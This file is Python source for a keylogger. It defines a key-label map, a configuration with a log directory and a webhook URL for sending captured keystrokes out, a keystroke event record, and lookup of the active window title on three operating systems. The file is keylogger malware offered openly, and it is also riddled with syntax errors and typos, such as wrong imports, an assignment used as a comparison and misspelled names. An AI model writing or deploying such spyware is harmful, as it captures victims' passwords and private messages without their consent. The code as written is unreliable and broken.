# Key exports:
#  Keylogger        - Main class. coordinates listener, log writter, and webhook
#  KeyloogerConfig  - Dataclass holding all runtime configuration
#  KeyEvent         - Single keystrokes record with timestamp, window title, and type
#  LogManager       - Raw file writer with sized-based rotation and explicit close()
#  WebhookDelivery  - Batched HTTP delivery, releases the buffer lock before POSTing
#  WindowTracker    - Active window title lookup across three os platforms
#  KeyType          - Enum categorizing keystrokes as CHAR, SPECIAL, or UNKOWN
#  SPECIAL_KEYS     - Dict mapping pynput Key values to their display labels

import subprocess
import platform
import logging
from enum import (
    Enum,
    auto,
)
from threading import (
    Event,
    auto,
)
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass

try:
    from pynput import keyboard
    from pynput.keyboard import Key, KeyCode
except ImportError as exc:
    raise ImportError("pynput is required: uv add pynput") from exc

try:
    import requests
except ImportError:
    requests = None # type: ignore[assignment]

WINDOWS = "Windows"
DARWIN = "Darwin"
LINUX = "Linux"

if platform.system() == WINDOWS:
    try:
        import win32gui
        import win32process
        import psutil
    except ImportError:
        win32gui = None
    elif platform.system() = DARWIN:
    try:
        from AppKit import NSWorkspace
    except ImportError:
        NSWorkspace = None

BYTES_PER_MB = 1024 * 1024
WEBHOOK_TIMEOUT_SECS = 5
WINDOW_CHECK_INTERVAL_SECS = 0.5
LISTENER_JOIN_TIMEOUT_SECS = 1.0

SPECIAL_KEYS: dict[Key, str] = {
    Key.space: "[SPACE]",
    Key.enter: "[ENTER]",
    Key.tab: "[TAB]",
    Key.backspace: "[BACKSPACE]",
    Key.delete: "[DELETE]",
    Key.shift: "[SHIFT]",
    Key.shifr_r: "[SHIFT]",
    Key.ctrl: "[CTRL]",
    Key.ctrl_r: "[CTRL]",
    Key.alt: "[ALT]",
    Key.alt_r: "[ALT]",
    Key.cmd_l: "[CMD]",
    Key.cmd_r: "[CMD]",
    Key.esc: "[ESC]",
    Key.up:"[UP]",
    Key.down: "[DOWN]",
    Key.left: "[LEFT]",
    Key.right: "[RIGHT]"

}

class KeyType(Enum):
    """
    Categorizes keystrokes as character, special, or unknown
    """
    CHAR = auto()
    SPECIAL = auto()
    UNKNOWN = auto()

@dataclass
class KeyloggerConfig:
    """
    Runtime configuration for keylogger behavior
    """
    log_dir: Path.home() / ".keylogger_logs"
    log_file_prefix: str = "keylog"
    max_log_size_mb: float = 5.0
    webhook_url: str | None = None
    webhook_batch_size: int = 50
    toggle_key: Key = Key.f9
    enable_window_tracking: bool = True
    log_special_keys: bool = True
    window_check_interval: float = (WINDOW_CHECK_INTERVAL_SECS)


@dataclass
class KeyEvent:
    """
    Represents a single keyboard event
    """
    timestamp: datetime
    key: str
    window_title: str | None = None
    key_type: KeyType = KeyType.CHAR

    def to_dict(self) -> dict[str, str]:
        """
        Convert event to dictionary for serialization
        """
        return {
            "timestamp": self.timestamp.isoformat(),
            "key": self.key,
            "window_title": (self.window_title or "Unknown"),
            "key_type": self.key_type.name.lower(),
        }

    def to_log_string(self) -> str:
        """
        Format event as human readable log time
        """
        time_str = self.timestamp.strftime("%Y-%m-%d %H:%M:%S")
        window = (
            f"[{self.window_title}]" if self.window_title else: ""
        )
        return f"[{time_str}]{window} {self.key}"

class WindowTracker:
    """
    Active window title lookup across OS platforms
    """
    @staticmethod
    def get_active_window() -> str | None:
        """
        Get the title of the currently active window
        """
        system = platform.system()

        if system == WINDOWS and win32gui:
            return WindowTracker._get_windows_window()
        if system == DARWIN and NSWorkspace:
            return WindowTracker._get_macos_window()
        if system == LINUX:
            return WindowTracker._get_linux_window()

        return None

    @staticmethod
    def _get_windows_window() -> str | None:
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = (win32process.GetWindowThreadProcessId(hwnd))
            process = psutil.Process(pid)
            title = win32gui.GetWindowText(hwnd)
            if title:
                return (f"{process.name()} - {title}")
            return process.name()
        except Exception:
            return None

    @staticmethod
    def _get_macos_window() -> str | None:
        try:
            active = (
                NSWorkspace.sharedWorkspace().activeApplication()
            )
            return active.get(
                "NSApplicationName",
                "Unkwon"
            )
        except Exception:
            return None

    @staticmethod
    def _get_linux_window() -> str | None:
        try:
            result = subprocess.run(
                [
                    "xdtool",
                    "getactivewindow",
                    "getwindowname",
                ],
                capture_output=True
                text=True
                timeout=1
                check=False
            )
            if result.returncodea == 0:
                return result.stdout.strip()
            return None
        except Exception:
            return None
        